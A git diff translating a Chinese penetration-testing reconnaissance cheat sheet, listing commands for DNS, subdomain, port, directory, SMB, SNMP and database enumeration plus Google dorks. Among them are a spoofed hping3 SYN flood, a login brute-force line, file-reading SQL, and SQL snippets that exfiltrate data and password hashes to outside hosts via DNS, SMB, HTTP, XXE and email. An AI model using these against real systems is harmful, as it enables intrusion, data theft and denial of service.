@@ -1,10 +1,10 @@
-# 侦查
+# Investigate
 
 ## 2.1.1
 
 ### 1.Whois
 
-whois 域名
+whois [domain.com]
 
 https://www.whois.com/whois/
 
@@ -12,11 +12,11 @@ https://centralops.net/co/DomainDossier.aspx
 
 ### 2.DNS
 
-dia a 域名
+dia a [domain.com]
 
-dnsrecon -d 域名 -t axfr
+dnsrecon -d [domain.com] -t axfr
 
-dnsenum 域名
+dnsenum [domain.com]
 
 dnsdumpster.com
 
@@ -26,7 +26,7 @@ dnsdumpster.com
 
 sitereport.netcraft.com
 
-### 4.子域名
+### 4.Subdomain
 
 searchdns.netcraft.com
 
@@ -40,7 +40,7 @@ source aort/bin/activate
 pip3 install aort
 ```
 
-aort -d 域名 --output subdomains.txt
+aort -d [domain.com] --output subdomains.txt
 
 #### Dome
 
@@ -52,9 +52,9 @@ source Dome/bin/activate
 pip install -r requirements.txt
 ```
 
-python3 dome.py -m passive -d 域名
+python3 dome.py -m passive -d [domain.com]
 
-python3 dome.py -d 域名 -m active -w wordlists/wordlist.txt
+python3 dome.py -d [domain.com] -m active -w wordlists/wordlist.txt
 
 #### Anubis
 
@@ -66,9 +66,9 @@ source anubis/bin/activate
 pip3 install anubis-netsec
 ```
 
-anubis -tip 域名 -o 文本文件
+anubis -tip [domain.com] -o [output.txt]
 
-anubis -t 域名 --with-nmap -o 文本文件 -i --overwrite-nmap-scan "-F -T5"
+anubis -t [domain.com] --with-nmap -o [output.txt] -i --overwrite-nmap-scan "-F -T5"
 
 #### Subfinder
 
@@ -76,33 +76,33 @@ anubis -t 域名 --with-nmap -o 文本文件 -i --overwrite-nmap-scan "-F -T5"
 go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
 ```
 
-./subfinder -d 域名
+./subfinder -d [domain.com]
 
-### 5.主机枚举
+### 5.Host Enumeration
 
 ```bash
-hping3 --scan 端口 -S 域名/IP地址
-hping3 -S --flood --rand-source -p 端口 IP地址/域名
-nmap -A -T4 IP地址/域名
-nmap -T4 -p 1-65535 IP地址/域名  //全端口扫描
-nmap -T4 IP地址/域名 --spoof-mac 0  //伪造MAC地址
-nmap -T4 -f IP地址/域名  //请求包分段
-nmap -D IP地址1,IP地址2,...... IP/域名  //伪造IP地址并插入攻击者IP地址
-nmap -D RND 随机IP地址数量 IP/域名  //随机IP地址伪造
-nmap --spoof-mac 0 --data-length 24 -T4 -f --mtu 16 -D RND -sS -sV -p 1-65535 -n -oA 文本文件 IP/域名
-//高隐蔽性扫描
+hping3 --scan [port] -S [domain.com/IP address]
+hping3 -S --flood --rand-source -p [port] [domain.com/IP address]
+nmap -A -T4 [domain.com/IP address]
+nmap -T4 -p 1-65535 [domain.com/IP address]  //Full port scan
+nmap -T4 [domain.com/IP address] --spoof-mac 0  //Fake MAC address
+nmap -T4 -f [domain.com/IP address]  //request packet fragmentation
+nmap -D [IP address1,IP address2,......] [IP address/domain.com]  //Fake IP address and insert attacker IP address
+nmap -D RND [Number of random IP addresses] [IP address/domain.com]  //Random IP address forgery
+nmap --spoof-mac 0 --data-length 24 -T4 -f --mtu 16 -D RND -sS -sV -p 1-65535 -n -oA [output.txt] [IP address/domain.com]
+//High stealth scan
 
-nmap IP地址段 --open -oG scan; cat scan | grep "/open" | cut -d " " -f 2 > active
+nmap [IP address segment] --open -oG scan; cat scan | grep "/open" | cut -d " " -f 2 > active
 cat active
-//查看地址段存活IP地址
+//View the surviving IP addresses of the address segment
 
-for x in 80 8080 443; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x IP地址段; done
-//枚举地址段端口状态
+for x in 80 8080 443; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x [IP address segment]; done
+//Enumerate address segment port status
 ```
 
 ## 2.1.2
 
-### 1.目录文件
+### 1.Directory file
 
 #### GoBuster
 
@@ -110,52 +110,52 @@ for x in 80 8080 443; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x IP地
 go install github.com/OJ/gobuster/v3@latest
 ```
 
-./gobuster dir -u IP地址或域名 -w 字典文件
+./gobuster dir -u [domain.com/IP address] -w [dictionary file]
 
-./gobuster dir -u IP地址或域名 -c 'cookie值' -t 50 -w 字典文件
+./gobuster dir -u [domain.com/IP address] -c 'cookie' -t 50 -w [dictionary file]
 
 #### Dirb
 
-dirb IP地址或域名
+dirb [domain.com/IP address]
 
-dirb IP地址或域名 -c "cookie值"
+dirb [domain.com/IP address] -c "cookie"
 
-dirb IP地址或域名 -p 代理IP地址:代理端口号
+dirb [domain.com/IP address] -p [Proxy IP address:Proxy port number]
 
-dirb IP地址或域名 -a "User-Agent值" 字典文件
+dirb [domain.com/IP address] -a "User-Agent" [dictionary file]
 
 #### Wfuzz
 
 ```bash
-wfuzz -w 字典文件路径 --hc 404 IP地址或域名/FUZZ
-wfuzz -w 字典文件 -w 字典文件 -w 字典文件 --hc 404 IP地址或域名/FUZZ/FUZ2ZFUZ3Z
-wfuzz -w 字典文件 --hc 404 IP地址或域名/FUZZ.php
-//枚举php文件
-wfuzz -z file,字典文件 -d "用户名参数=FUZZ&密码参数=FUZZ" --hc 302 IP地址或域名
-//枚举用户名密码
-wfuzz -w 字典文件 -b cookie="cookie值" IP地址或域名/FUZZ
-//枚举登陆后网站
-wfuzz -f,/字典文件 -p 代理IP地址:代理端口 --hc 404 IP地址或域名/FUZZ
-//使用代理枚举
+wfuzz -w [dictionary file] --hc 404 [domain.com/IP address]/FUZZ
+wfuzz -w [dictionary file] -w [dictionary file] -w [dictionary file] --hc 404 [domain.com/IP address]/FUZZ/FUZ2ZFUZ3Z
+wfuzz -w [dictionary file] --hc 404 [domain.com/IP address]/FUZZ.php
+//Enumerate php files
+wfuzz -z file,[dictionary file] -d "[username parameter]=FUZZ&[password parameter]=FUZZ" --hc 302 [domain.com/IP address]
+//Enumerate username and password
+wfuzz -w [dictionary file] -b cookie="cookie" [domain.com/IP address]/FUZZ
+//Enumerate sites after login
+wfuzz -f,/[dictionary file] -p [Proxy IP address:Proxy port number] --hc 404 [domain.com/IP address]/FUZZ
+//Use proxy enumeration
 ```
 
 #### ffuf
 
 ```bash
-ffuf -u IP地址或域名/FUZZ -c -w 字典文件
-ffuf -mc all -fc 404 -ac -sf -s -w 字典文件 -c -u IP地址或域名/FUZZ
-ffuf -u IP地址或域名/FUZZ -w 字典文件 -recursion -c //递归扫描
-ffuf -u IP地址或域名/FUZZ -w 字典文件 -recursion -e .文件后缀 -c
-//枚举后缀文件
+ffuf -u [domain.com/IP address]/FUZZ -c -w [dictionary file]
+ffuf -mc all -fc 404 -ac -sf -s -w [dictionary file] -c -u [domain.com/IP address]/FUZZ
+ffuf -u [domain.com/IP address]/FUZZ -w [dictionary file] -recursion -c //Recursive scan
+ffuf -u [domain.com/IP address]/FUZZ -w [dictionary file] -recursion -e .[File extension] -c
+//Enumeration suffix files
 ```
 
-#### 字典文件
+#### Dictionary file
 
 https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content
 
-### 2.指纹识别
+### 2.Website fingerprinting
 
-#### 插件
+#### Plugins
 
 Wappalyzer
 
@@ -164,135 +164,136 @@ What runs
 #### WhatWEB
 
 ```bash
-whatweb IP地址或域名
-whatweb IP地址或域名 -v
-whatweb IP地址或域名 -H:HTTP头:HTTP头 -U:User-Agent
+whatweb [domain.com/IP address]
+whatweb [domain.com/IP address] -v
+whatweb [domain.com/IP address] -H:[HTTP]:[HTTP] -U:[User-Agent]
 ```
 
-### 3.Waf识别
+### 3.Waf
 
 ```bash
-wafw00f IP地址或域名
+wafw00f [domain.com/IP address]
 ```
 
-### 4.网页提取
+### 4.Web extraction
 
 #### Gospider
 
 ```bash
 go install github.com/jaeles-project/gospider@latest
-./gospider -s "http://域名或IP地址/" --js -t 20 -d 2 --sitemap --robots -w -r > urls.txt
+./gospider -s "http://[domain.com/IP address]/" --js -t 20 -d 2 --sitemap --robots -w -r > urls.txt
 cat urls.txt | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
 ```
 
 #### Curl
 
 ```bash
-curl 域名或IP地址/JavaScript文件地址 | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
+curl [domain.com/IP address]/[JavaScript file] | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
 ```
 
 #### LinkFinder
 
 ```bash
-python3 linkfinder.py -d -i 域名或IP地址
+python3 linkfinder.py -d -i [domain.com/IP address]
 ```
 
-### 5.运行服务
+### 5.Run service
 
 #### SAMB/SMB
 
 ```bash
-nbtscan IP地址和nmblookup -A IP地址
-nbtstat -A IP地址
-enum4linux IP地址
-smbmap -H IP地址
+nbtscan [IP address]
+nmblookup -A [IP address]
+nbtstat -A [IP address]
+enum4linux [IP address]
+smbmap -H [IP address]
 
-smbclient -L IP地址
-smbclient //IP地址/共享的驱动器或文件夹
-//连接目标主机的SMB服务
+smbclient -L [IP address]
+smbclient //[IP address]/[Shared drive or folder]
+//Connect to the SMB service of the target host
 
-nmap --script smb-enum-shares -p139,445 IP地址
-//使用Nmap列出共享驱动器
+nmap --script smb-enum-shares -p139,445 [IP address]
+//List shared drives using Nmap
 
-crackmapexec smb IP地址 -u 'SMB用户名' -p 'SMB密码' –shares
-//枚举SMB共享
+crackmapexec smb [IP address] -u 'SMB username' -p 'SMB password' –shares
+//Enumerate SMB shares
 
 use auxiliary/scanner/smb/smb_lookupsid
-//查看目标主机的本地用户
+//View the local users of the target host
 ```
 
 #### SNMP
 
 ```bash
-nmap -sU -p161 -script=snmp-brute IP地址
-snmpwalk -v 1 -c IP地址
-snmpset -v 1 -c public IP地址 iso.3.6.1.2.1.1.5.0 s 更改字符串内容
-snmpwalk -v 1 -c public IP地址 1.3.6.1.2.1.1.5.0
-snmpwalk -v 1 -c public IP地址 1.3.6.1.2.1.25.2.2  //查看系统内存大小
-snmpwalk -v 1 -c public IP地址 1.3.6.1.2.1.4.20  //查看系统内IP地址
-snmpwalk -v 1 -c public IP地址 1.3.6.1.2.1.1  //查看系统信息
-nmap -sU -p161 -script=snmp-sysdescr IP地址
-snmp-check IP地址 -p 161 -c public
+nmap -sU -p161 -script=snmp-brute [IP address]
+snmpwalk -v 1 -c [IP address]
+snmpset -v 1 -c public [IP address] iso.3.6.1.2.1.1.5.0 s [change string content]
+snmpwalk -v 1 -c public [IP address] 1.3.6.1.2.1.1.5.0
+snmpwalk -v 1 -c public [IP address] 1.3.6.1.2.1.25.2.2  //View system memory size
+snmpwalk -v 1 -c public [IP address] 1.3.6.1.2.1.4.20  //View the IP address in the system
+snmpwalk -v 1 -c public [IP address] 1.3.6.1.2.1.1  //View system information
+nmap -sU -p161 -script=snmp-sysdescr [IP address]
+snmp-check [IP address] -p 161 -c public
 ```
 
 #### NFS/RPC
 
 ```bash
-showmount -e IP地址
-rpcinfo -p IP地址
-nmap -sV -script=nfs-showmount IP地址
+showmount -e [IP address]
+rpcinfo -p [IP address]
+nmap -sV -script=nfs-showmount [IP address]
 ```
 
 #### MySql
 
 ```bash
-nmap --script=mysql-info -p3306 IP地址
+nmap --script=mysql-info -p3306 [IP address]
 ```
 
 ```sql
 SELECT host, user FROM mysql.user WHERE Super_priv = 'Y';
-//获取目标主机DBA用户
+//DBA Accounts
 SELECT @@datadir;
-//获取MySql数据路径
+//Path to Data
 SELECT LOAD_FILE('/etc/passwd')；
 SELECT LOAD_FILE(0x2f6574632f706173737764);
-//读取/etc/passwd
+//Read File
 ```
 
-数据转储
+Data Exfiltration
 
 ```sql
-SELECT LOAD_FILE(concat('\\\\',(SQL语句), '.DNSLog主机\\'));
-//DNS转储
-SELECT * FROM USERS INTO OUTFILE '\\IP地址\SMB驱动器和文件共享\output.txt';
-//SMB转储
+SELECT LOAD_FILE(concat('\\\\',(sql statement), '.[DNSLog host]\\'));
+//DNS Request
+SELECT * FROM USERS INTO OUTFILE '\\[IP address]\[SMB drives and file sharing]\output.txt';
+//SMB Share
 SELECT * FROM USERS INTO OUTFILE '/var/www/html/output.txt';
-//转储文件到网页目录
+//HTTP Server
 ```
 
 #### Oracle
 
 ```sql
 SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = 'YES';
-//获取DBA用户
+//DBA Accounts
 
 SELECT * FROM session_privs;
 SELECT * FROM dba_sys_privs WHERE grantee = 'DBSNMP';
 SELECT grantee FROM dba_sys_privs WHERE privilege = 'SELECT ANY DICTIONARY';
 SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;
-//检测当前权限
+//Privileges
 
 SELECT name FROM V$DATAFILE;
-//获取当前数据库文件位置
+//Location of DB Files
 
 SELECT UTL_INADDR.get_host_name FROM dual;
 SELECT host_name FROM v$instance;
 SELECT UTL_INADDR.get_host_address FROM dual;
-SELECT UTL_INADDR.get_host_name('IP地址') FROM dual;
-//获取主机名和IP地址
+SELECT UTL_INADDR.get_host_name('[IP address]') FROM dual;
+//Hostname, IP address
 ```
 
-读取文件
+Read file
 
 ```sql
 SQL>
@@ -300,27 +301,27 @@ declare
   f utl_file.file_type;
   s varchar(200);
 begin
-  f := utl_file.fopen('/root', '文本文件', 'R');
+  f := utl_file.fopen('/root', '[file]', 'R');
   utl_file.get_line(f,s);
   utl_file.fclose(f);
   dbms_output.put_line(s);
 end;
 /
-set serveroutput ON  //允许屏幕输出
-/  //再次运行命令即可查看指定文本文件的200个字符
+set serveroutput ON  //Allow screen output
+/  //Run the command again to view the 200 characters of the specified text file
 ```
 
-数据转储
+Data Exfiltration
 
 ```sql
 SELECT xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://IP/test"> %remote; %param1;]>') FROM dual;
-//XML外部实体
+//XML external entity
 
-SELECT UTL_HTTP.request ('http://IP地址/') FROM dual;
+SELECT UTL_HTTP.request ('http://[IP address]/') FROM dual;
 //UTL_HTTP
 
 SELECT UTL_URL.escape('http://IP/' || USER) FROM dual;
-//特殊字符转义
+//Escaping special characters
 ```
 
 #### SQL Server
@@ -336,44 +337,44 @@ https://github.com/NetSPI/PowerUpSQL/tree/master/templates/tsql
 ```powershell
 powershell -ep bypass
 Import-Module .\PowerUpSQL.ps1
-Get-SQLInstanceLocal -Verbose  //获取SQL Server状态
-Get-SQLServerInfoThreaded -Threads 10 -Verbose  //获取主机基本信息
-Get-SQLDomainComputer  //查看当前域主机
+Get-SQLInstanceLocal -Verbose  //Get SQL Server Status
+Get-SQLServerInfoThreaded -Threads 10 -Verbose  //Obtain basic host information
+Get-SQLDomainComputer  //View the current domain host
 ```
 
-读取文件
+Read file
 
 ```sql
 1.txt
 sp_configure 'show advanced options',1
 reconfigure
 go
-//启用高级显示
+//Enable show advanced options
 sp_configure 'ad hoc distributed queries',1
 reconfigure
 go
-//启用临时查询
+//Enable ad hoc queries
 EXEC sp_MSset_oledb_prop
-//显示可用的程序
+//list available providers
 SELECT * FROM OpenDataSource( 'Microsoft.ACE.OLEDB.12.0','Data Source="c:\temp";Extended properties="Text;hdr=no"')...file#txt
-//读取一个文本文件
+//Read a text file
 
-2.本地文件
+2.Local files
 CREATE TABLE #file (content nvarchar(4000));
-//创建临时表
+//Create temp table
 BULK INSERT #file FROM 'c:\temp\file.txt';
-//将文件插入临时表
+//Read file into temp table
 SELECT content FROM #file
 
-3.UNC路径
+3.UNC
 CREATE TABLE #file (content nvarchar(4000));
 BULK INSERT #file FROM '\\127.0.0.1\c$\temp\file.txt';
-//将文件插入临时表
+//Read file into temp table
 SELECT content FROM #file
 DROP TABLE #file
-//删除临时表
+//Drop temp table
 
-4.WebDav路径
+4.WebDav
 CREATE TABLE #file (content nvarchar(4000));
 BULK INSERT #file FROM '\\sharepoint.acme.com@SSL\Path\to\file.txt';
 SELECT content FROM #file
@@ -383,82 +384,82 @@ DROP TABLE #file
 sp_configure 'show advanced options',1
 reconfigure
 go
-//启用高级显示
+//Enable show advanced options
 sp_configure 'ad hoc distributed queries',1
 reconfigure
 go
-//启用临时查询
+//Enable ad hoc queries
 EXEC sp_MSset_oledb_prop
-//显示可用程序
+//list available providers
 SELECT * FROM OPENDATASOURCE('Microsoft.ACE.OLEDB.12.0','Data Source=C:\windows\temp\Book1.xlsx;Extended Properties=Excel 8.0')...[Targets$]
-//读取文件，适用于UNC路径和WebDav路径(目标Web服务器需要支持propfind)
+//Read files, suitable for UNC paths and WebDav paths (target web server needs to support propfind)
 
 6.OpenRowSet
 sp_configure 'show advanced options',1
 reconfigure
 go
-//启用高级显示
+//Enable show advanced options
 sp_configure 'ad hoc distributed queries',1
 reconfigure
 go
-启用临时查询
+Enable ad hoc queries
 SELECT cast(BulkColumn as varchar(max)) as Document FROM OPENROWSET(BULK N'C:\windows\temp\blah.txt', SINGLE_BLOB) AS Document
-//读取文件，适用于UNC路径和WebDav路径(目标Web服务器需要支持propfind)
+//Read files, suitable for UNC paths and WebDav paths (target web server needs to support propfind)
 
 7.OpenRowSet txt
 EXEC sp_MSset_oledb_prop
-//显示可用程序
+//list available providers
 sp_configure 'show advanced options',1
 reconfigure
 go
-//启用高级显示
+//Enable show advanced options
 sp_configure 'ad hoc distributed queries',1
 reconfigure
 go
-//启用临时查询
+//Enable ad hoc queries
 SELECT * FROM OPENROWSET('Microsoft.ACE.OLEDB.12.0','Text;Database=c:\temp\;HDR=Yes;FORMAT=text', 'SELECT * FROM [file.txt]')
-//读取文件，适用于UNC路径和WebDav路径(目标Web服务器需要支持propfind)
+//Read files, suitable for UNC paths and WebDav paths (target web server needs to support propfind)
 
 8.OpenRowSet xlsx
 EXEC sp_MSset_oledb_prop
-//显示可用程序
+//list available providers
 sp_configure 'show advanced options',1
 reconfigure
 go
-//启用高级显示
+//Enable show advanced options
 sp_configure 'ad hoc distributed queries',1
 reconfigure
 go
-//启用临时查询
+//Enable ad hoc queries
 SELECT column1 FROM OPENROWSET('Microsoft.ACE.OLEDB.12.0', 'Excel 12.0;Database=C:\windows\temp\Book1.xlsx;', 'SELECT * FROM [Targets$]')
-//读取文件，适用于UNC路径和WebDav路径(目标Web服务器需要支持propfind)
+//Read files, suitable for UNC paths and WebDav paths (target web server needs to support propfind)
 ```
 
-数据转储
+Data Exfiltration
 
 ```sql
 DECLARE @host varchar(800);
 select @host = name + '-' + master.sys.fn_varbintohexstr(password_hash) + '.domain.com' from sys.sql_logins;
 exec('xp_fileexist "\' + @host + \'c$boot.ini"');
-//DNS查询
+//DNS
 
 xp_dirtree '\\data.domain.com\file'
-//UNC路径
+//UNC
 
 sp_configure 'show advanced options', 1;RECONFIGURE;sp_configure 'Database Mail XPs', 1;RECONFIGURE;exec msdb..sp_send_dbmail @recipients='snowwolf@email.com',@query='select @@version';
-//sp_send_dbmail查询
+//sp_send_dbmail
 
 EXEC master..xp_sendmail 'snowwolf@email.com', 'test.'
-//xp_sendmail查询
+//Basic xp_sendmail Query
 
 EXEC xp_sendmail @recipients='snowwolf@email.com',
 @message='test.',
 @copy_recipients='snowwolf@email.com',
 @subject='TEST'
-//xp_sendmail发送完整邮件
+//Send Full Email with xp_sendmail
 
 EXEC xp_sendmail 'snowwolf@email.com', @query='SELECT @@version';
-//xp_sendmail
+//Send Query Results Via xp_sendmail
 
 CREATE TABLE ##texttab (c1 text)
 INSERT ##texttab values ('test.')
@@ -467,7 +468,7 @@ SET @cmd = 'SELECT c1 from ##texttab'
 EXEC master.dbo.xp_sendmail 'robertk',
 @query = @cmd, @no_header='TRUE'
 DROP TABLE ##texttab
-//将查询结果作为附件
+//Send Query Results as Attachment Via xp_sendmail
 ```
 
 ## 2.1.3
@@ -475,43 +476,43 @@ DROP TABLE ##texttab
 ### Amass
 
 ```bash
-amass enum -passive -d 域名 -src
-amass enum -active -d 域名
-amass enum -v -src -ip -brute -min-for-recursive 2 -d 域名
-amass viz -d3 -d 域名
+amass enum -passive -d [domain.com] -src
+amass enum -active -d [domain.com]
+amass enum -v -src -ip -brute -min-for-recursive 2 -d [domain.com]
+amass viz -d3 -d [domain.com]
 ```
 
 ### IVRE
 
 ```bash
 apt install ivre ivre-doc
-ivre ipinfo –init  //初始化IP地址信息
-ivre scancli –init  //初始化主动扫描数据库
-ivre view –init  //初始化视图信息
-ivre flowcli –init  //初始化数据流信息
-sudo ivre runscansagentdb –init  //初始化远程代理扫描
-ivre ipdata –download  //下载IP地址数据
+ivre ipinfo –init  //Initialize IP address information
+ivre scancli –init  //Initialize the active scan database
+ivre view –init  //Initialize view information
+ivre flowcli –init  //Initialize data flow information
+sudo ivre runscansagentdb –init  //Initiate remote proxy scan
+ivre ipdata –download  //Download IP address data
 ivre runscans --routable --limit 100 --output=XMLFork --processes 10
-//运行10个并发Nmap进程来枚举随机100个IP地址
+//Run 10 concurrent Nmap processes to enumerate 100 random IP addresses
 ivre scan2db -c ROUTABLE-001 -s MySource -r scans/ROUTABLE/up
-//分析Nmap的扫描结果并将其添加到数据库中
+//Analyze Nmap scan results and add them to the database
 ivre db2view nmap
-//从Nmap扫描结果和被动侦查的数据库中创建视图
+//Create views from Nmap scan results and passive reconnaissance databases
 ivre scancli –count
-//统计数据
+//Statistical data
 ivre httpd --bind-address 0.0.0.0
-//启动WEB图形化显示
+//Start WEB graphical display
 
 rm -rf scans/ROUTABLE/*
-//清除测试数据
-ivre scancli --init && ivre view –init //数据初始化
-ivre runscans --routable --categories 自定义分类名 --network 网段 --output=XMLFork --processes 10  //自定义网段扫描
-ivre scan2db -c 自定义分类名 -s 扫描源 -r scans/自定义分类名/up
+//Clear test data
+ivre scancli --init && ivre view –init //Data initialization
+ivre runscans --routable --categories [custom category name] --network [network segment] --output=XMLFork --processes 10  //Custom network segment scanning
+ivre scan2db -c [custom category name] -s [Scan source] -r scans/[custom category name]/up
 ivre db2view nmap
 ivre httpd --bind-address 0.0.0.0
 ```
 
-### 在线网站
+### Online site
 
 https://osintframework.com/
 
@@ -543,45 +544,45 @@ https://www.corporationwiki.com/
 
 ```dork
 site:http://ideone.com | site:http://codebeautify.org | site:http://codeshare.io | site:http://codepen.io | site:http://repl.it | site:http://jsfiddle.net "company"
-//代码共享
+//Code sharing
 site:github.com | site:gitlab.com | site:bitbucket.org "company"
 site:stackoverflow.com "target.com"
 site:http://trello.com | site:*.atlassian.net "company"
-//项目管理站点
+//Project management site
 site:http://justpaste.it | site:http://pastebin.com "company"
 site:target.com ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:txt | ext:ora | ext:env | ext:ini
-//配置文件
+//Configuration file
 site:target.com ext:sql | ext:dbf | ext:mdb
-//数据库文件
+//Database file
 site:target.com ext:bkf | ext:bkp | ext:bak | ext:old | ext:backup
-//备份文件
+//Backup file
 inurl:"/.git" target.com -github
-//git文件
+//git file
 site:target.com ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv
-//公开文件
+//Public documents
 site:target.com intitle:index.of | ext:log | ext:php intitle:phpinfo "published by the PHP Group" | inurl:shell | inurl:backdoor | inurl:wso | inurl:cmd | shadow | passwd | boot.ini | inurl:backdoor | inurl:readme | inurl:license | inurl:install | inurl:setup | inurl:config | inurl:"/phpinfo.php" | inurl:".htaccess" | ext:swf
-//其它文件
+//Other documents
 site:target.com intext:"sql syntax near" | intext:"syntax error has occurred" | intext:"incorrect syntax near" | intext:"unexpected end of SQL command" | intext:"Warning: mysql_connect()" | intext:"Warning: mysql_query()" | intext:"Warning: pg_connect()"
-//SQL 错误
+//SQL error
 site:target.com "PHP Parse error" | "PHP Warning" | "PHP Error"
-//PHP错误
+//PHP error
 site:target.com inurl:signup | inurl:register | intitle:Signup
-//登录页面
+//Log in page
 site:target.com inurl:redir | inurl:url | inurl:redirect | inurl:return | inurl:src=http | inurl:r=http
-//重定向
+//Redirect
 site:target.com ext:action | ext:struts | ext:do
 //Apache Struts RCE
 site:pastebin.com target.com
 site:linkedin.com employees target.com
-//领英员工搜索
+//LinkedIn Employee Search
 site:target.com inurl:wp-content | inurl:wp-includes
-//WordPress文件
+//WordPress file
 site:*.target.com
-//子域名
+//Subdomain
 site:*.*.target.com
-//子域名
+//Subdomain
 site:.s3.amazonaws.com | site:http://storage.googleapis.com | site:http://amazonaws.com "target"
-//S3桶
+//S3 bucket
 intitle:traefik inurl:8080/dashboard "target"
 intitle:"Dashboard [Jenkins]"
 ```
@@ -949,15 +950,20 @@ pip install -r requirements.txt
 pip install jsbeautifier
 python3 manage.py makemigrations
 python3 manage.py migrate
-修改主目录下的config.json文件中的Binary Edge API
+
+Modify the Binary Edge API in the config.json file in the main directory
+
 python3 manage.py runserver
-另起终端
+
+start another terminal
 apt-get install redis redis-server
 redis-server
-再次另起终端并切换到工具主目录
+
+Start the terminal again and switch to the tool home directory
 celery -A leaklooker worker --loglevel=info
 
-命令：
+Command
+
 Rsync:
 rsync -az IP:/module ~/ — progress
 rsync — list-only IP:/
@@ -987,8 +993,8 @@ _cat/count?v
 <indices>/_search?size=50
 ```
 
-### 邮箱
+### Mail
 
 Hunter.io
 
-filetype:xls inurl:"email.xls" site:"域名"
+filetype:xls inurl:"email.xls" site:"domain.com"
